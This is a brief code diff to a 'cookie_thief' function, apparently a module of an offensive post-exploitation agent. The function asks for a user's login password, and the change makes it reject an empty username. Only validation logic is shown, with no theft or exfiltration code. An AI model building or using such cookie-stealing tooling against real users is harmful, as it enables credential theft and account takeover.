@@ -15,7 +15,7 @@ exports.cookie_thief = function(task, command, params){
       return {'user_output': "Must supply a the user's login password", "completed": true, "status": "error"};
     }
 
-    if(config.hasOwnProperty("username") && typeof config['username'] == 'string') {
+    if(config.hasOwnProperty("username") && typeof config['username'] == 'string' && config['username']) {
         username = config['username'];
     }
     else {
